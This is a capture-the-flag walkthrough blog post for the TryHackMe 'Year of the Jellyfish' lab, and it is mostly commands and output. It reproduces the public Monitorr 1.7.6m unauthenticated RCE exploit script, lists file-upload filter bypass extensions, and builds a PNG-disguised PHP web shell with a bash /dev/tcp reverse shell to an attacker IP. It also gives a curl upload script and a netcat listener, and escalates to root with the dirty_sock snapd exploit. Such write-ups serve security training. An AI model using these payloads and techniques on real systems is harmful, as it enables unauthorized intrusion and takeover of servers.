---
layout: post
title:  "TryHackMe - Year of the Jellyfish"
categories: [TryHackMe,walkthrough]
pin: true
tags: [monitorr,curl,cookie,dirtysock,magicbytes,extensions,Upload]
image: /images/jelly.jpg
---

#### TryHackMe - Year of the Jellyfish

## Port Scan

```sh
┌──(alienum㉿kali)-[~]
└─$ sudo nmap -A -O -sS 34.245.126.95
[sudo] password for alienum:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 17:13 EEST
Nmap scan report for ec2-18-202-78-65.eu-west-1.compute.amazonaws.com (18.202.78.65)
Host is up (0.0053s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE    VERSION
21/tcp  open  tcpwrapped
22/tcp  open  tcpwrapped
| ssh-hostkey:
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
80/tcp  open  tcpwrapped
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Not valid before: 2021-04-26T14:07:14
|_Not valid after:  2022-04-26T14:07:14
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: storage-misc
Running (JUST GUESSING): British Gas embedded (92%)
Aggressive OS guesses: British Gas GS-Z3 data logger (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.33 ms ec2-18-202-78-65.eu-west-1.compute.amazonaws.com (18.202.78.65)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.85 seconds

┌──(alienum㉿kali)-[~]
└─$

```


## Edit /etc/hosts

```sh
34.245.126.95       robyns-petshop.thm  monitorr.robyns-petshop.thm  beta.robyns-petshop.thm  dev.robyns-petshop.thm
```

Our Target is : `monitorr.robyns-petshop.thm`

## Searchsploit

```sh
┌──(alienum㉿kali)-[~/Desktop/oscp]
└─$ searchsploit monitor 1.7.6
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Monitorr 1.7.6m - Authorization Bypass        | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution (Unau | php/webapps/48980.py
Net Monitor for Employees Pro < 5.3.4 - Unquo | windows/local/42141.txt
Papenmeier WiFi Baby Monitor Free & Lite < 2. | android/remote/44242.md
Pronestor Health Monitoring < 8.1.11.0 - Priv | windows/local/46988.txt
PRTG Network Monitor < 18.1.39.1648 - Stack O | windows_x86/dos/44500.py
Red-Gate SQL Monitor < 3.10 / 4.2 - Authentic | windows/webapps/42444.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(alienum㉿kali)-[~/Desktop/oscp]
└─$
```

Target : `Monitorr 1.7.6m - Remote Code Execution (Unau | php/webapps/48980.py`

I had the same experience with the same CVE from [VulnHub - ICMP](https://al1enum.github.io/vulnhub/walkthrough/2021/03/07/vulnhub-icmp.html)
But time the script doesn't work.

*Inspect Element*

Found a unique cookie : `"isHuman": "1"`

## CVE - Customazation

```sh
┌──(alienum㉿kali)-[~/Desktop/oscp]
└─$ locate php/webapps/48980.py
/usr/share/exploitdb/exploits/php/webapps/48980.py

┌──(alienum㉿kali)-[~/Desktop/oscp]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/48980.py .

┌──(alienum㉿kali)-[~/Desktop/oscp]
└─$ mv /home/alienum/Downloads/robyns-petshop-thm.pem /home/alienum/Desktop/oscp/r.pem
```

## Script Failed

```sh
┌──(alienum㉿kali)-[~/Desktop/oscp]
└─$ cat 48980.py      
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

import requests
import os
import sys

if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    cookie =  {"isHuman": "1"}
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.png.phP\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    requests.post(url, headers=headers, data=data, cookies=cookie, verify='r.pem')

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.png.phP"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    requests.get(url, headers=headers, cookies=cookie, verify='r.pem')
```

Again the Script failed, after that i gave up for a while and i tried again with the famous CURL ;)

## File Upload | CURL

This is a very usefull article to see how curl upload file works : [Petehouston - Upload Files with curl](https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76)


## PHP | Bypass File Upload Restriction

*alternative extensions*

```sh
.pht, .phtml, .php3, .php4, .php5, .php6, .inc
```

*tricks*

```sh
.pHp, .Php, .phP
```


more here : [Null Byte : Bypass Restrictions](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/)


## PNG | MAGIC Bytes

See this useful blog : [HackTricks - File Upload #magic-header-bytes](https://book.hacktricks.xyz/pentesting-web/file-upload#magic-header-bytes)

```sh
┌──(alienum㉿kali)-[~/Desktop/oscp]
└─$ echo -e $'\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[\n<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.8.28.219/443 0>&1\'");' > she_ll.png.phP

┌──(alienum㉿kali)-[~/Desktop/oscp]
└─$ file she_ll.png.phP
she_ll.png.phP: PNG image data, 840 x 29488, 3-bit
```

- Note [echo -e] enable interpretation of the following backslash escapes

*Listener*

```sh
sudo nc -lnvp 443
```

## Upload Script

```python
import os
import sys
import time

os.system('curl -k -F "fileToUpload=@./she_ll.png.phP" -H "Cookie: isHuman=1" https://monitorr.robyns-petshop.thm/assets/php/upload.php')
print('[+] Shell Uploaded')
print('[+] Sleep')
time.sleep(4)
print('Go to : https://monitorr.robyns-petshop.thm/assets/data/usrimg/sh_ell.png.php and trigger it')
```

*Proof*

![image]( /assets/img/yotj/1.PNG)

## Privileges Escalation

Usefull scripts

1. linpeas.sh
   - [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
2. linuxprivchecker.py
   - []
3. lse.sh (Linux Smart Enumeration)
  - [lse](https://github.com/diego-treitos/linux-smart-enumeration)
4. les.sh (Linux Exploit Suggester)
  - [les2.pl - script1](https://github.com/jondonas/linux-exploit-suggester-2)
  - [les.sh - script2](https://github.com/mzet-/linux-exploit-suggester)


## Root

The only usefull script was the `les.sh - script2` by mzet

```wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh```


#### SUID Perms

```sh
www-data@petshop:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/snap/core/10958/bin/mount
/snap/core/10958/bin/ping
/snap/core/10958/bin/ping6
/snap/core/10958/bin/su
/snap/core/10958/bin/umount
/snap/core/10958/usr/bin/chfn
/snap/core/10958/usr/bin/chsh
/snap/core/10958/usr/bin/gpasswd
/snap/core/10958/usr/bin/newgrp
/snap/core/10958/usr/bin/passwd
/snap/core/10958/usr/bin/sudo
/snap/core/10958/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/10958/usr/lib/openssh/ssh-keysign
/snap/core/10958/usr/lib/snapd/snap-confine
/snap/core/10958/usr/sbin/pppd
/bin/mount
/bin/su
/bin/ping
/bin/umount
/bin/fusermount
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newuidmap
```

####

```sh
www-data@petshop:/tmp$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
t-suggester/master/linux-exploit-suggester.sh -O les.shoit
--2021-04-27 00:19:57--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 87559 (86K) [text/plain]
Saving to: 'les.sh'

     0K .......... .......... .......... .......... .......... 58% 4.59M 0s
    50K .......... .......... .......... .....                100% 11.7M=0.01s

2021-04-27 00:19:57 (6.14 MB/s) - 'les.sh' saved [87559/87559]

www-data@petshop:/tmp$ chmod +x les.sh
chmod +x les.sh
www-data@petshop:/tmp$ ./les.sh
./les.sh

Available information:

Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

76 kernel space exploits
48 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2019-7304] dirty_sock

   Details: https://initblog.com/2019/dirty-sock/
   Exposure: less probable
   Tags: ubuntu=18.10,mint=19
   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
   Comments: Distros use own versioning scheme. Manual verification needed.

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL:
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

www-data@petshop:/tmp$
```

![image]( /assets/img/yotj/2.PNG)

#### Focus

```sh
[+] [CVE-2019-7304] dirty_sock

   Details: https://initblog.com/2019/dirty-sock/
   Exposure: less probable
   Tags: ubuntu=18.10,mint=19
   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
   Comments: Distros use own versioning scheme. Manual verification needed.
```

#### Exploitation

```sh
www-data@petshop:/tmp$ wget https://github.com/initstring/dirty_sock/archive/master.zip
ter.ziptps://github.com/initstring/dirty_sock/archive/mast
--2021-04-27 00:56:14--  https://github.com/initstring/dirty_sock/archive/master.zip
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://codeload.github.com/initstring/dirty_sock/zip/master [following]
--2021-04-27 00:56:14--  https://codeload.github.com/initstring/dirty_sock/zip/master
Resolving codeload.github.com (codeload.github.com)... 140.82.121.9
Connecting to codeload.github.com (codeload.github.com)|140.82.121.9|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/zip]
Saving to: 'master.zip'

master.zip              [ <=>                ]  21.86K  --.-KB/s    in 0.02s   

2021-04-27 00:56:14 (983 KB/s) - 'master.zip' saved [22384]

www-data@petshop:/tmp$ unzip master.zip
unzip master.zip
Archive:  master.zip
c68e35ae3eb7f49a398c7d7f35bb920c79dc9b0e
   creating: dirty_sock-master/
   creating: dirty_sock-master/.github/
   creating: dirty_sock-master/.github/ISSUE_TEMPLATE/
  inflating: dirty_sock-master/.github/ISSUE_TEMPLATE/bug_report.md  
  inflating: dirty_sock-master/LICENSE  
  inflating: dirty_sock-master/README.md  
  inflating: dirty_sock-master/dirty_sockv1.py  
  inflating: dirty_sock-master/dirty_sockv2.py  
www-data@petshop:/tmp$ cd dirty_sock-master/
cd dirty_sock-master/
www-data@petshop:/tmp/dirty_sock-master$ ls
ls
LICENSE  README.md  dirty_sockv1.py  dirty_sockv2.py
www-data@petshop:/tmp/dirty_sock-master$ python3 dirty_sockv2.py
python3 dirty_sockv2.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/kqjibochxd;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[!] System may not be vulnerable, here is the API reply:


HTTP/1.1 401 Unauthorized
Content-Type: application/json
Date: Mon, 26 Apr 2021 23:56:54 GMT
Content-Length: 119

{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
www-data@petshop:/tmp/dirty_sock-master$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:109:114::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
robyn:x:1000:1000:Robyn Mackenzie,,,:/home/robyn:/bin/bash
ftp:x:111:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
jellyfin:x:112:118:Jellyfin default user,,,:/var/lib/jellyfin:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash

www-data@petshop:/tmp/dirty_sock-master$ su dirty_sock
su dirty_sock
Password: dirty_sock

dirty_sock@petshop:/tmp/dirty_sock-master$ id
id
uid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock),27(sudo)
dirty_sock@petshop:/tmp/dirty_sock-master$ sudo su root
sudo su root
root@petshop:/tmp/dirty_sock-master# cd
cd
root@petshop:~# ls
ls
note.txt  root.txt  snap
root@petshop:~#
```

![image]( /assets/img/yotj/3.PNG)
